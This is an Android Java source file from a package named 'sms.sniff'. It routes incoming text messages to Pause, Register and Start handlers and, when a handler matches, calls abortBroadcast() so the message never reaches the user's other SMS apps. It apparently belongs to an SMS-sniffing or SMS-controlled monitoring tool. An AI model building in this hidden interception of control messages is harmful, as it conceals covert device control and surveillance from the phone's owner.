package sms.sniff.behaviors;

import java.util.Arrays;
import java.util.List;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.telephony.SmsMessage;

public class BehaviorProcessor {

	private BroadcastReceiver receiver;
	private Context context;

	public BehaviorProcessor(BroadcastReceiver receiver, Context context) {
		this.receiver = receiver;
		this.context = context;
	}

	public void process(SmsMessage sms) {
		List<Behavior> behaviors = Arrays.asList(
			new Pause(context),
			new Register(context),
			new Start(context)
		);
		
		for (Behavior behavior : behaviors) {
			if(behavior.canProcess(sms)) {
				behavior.process(sms);
				receiver.abortBroadcast();
			}
		}
	}
}
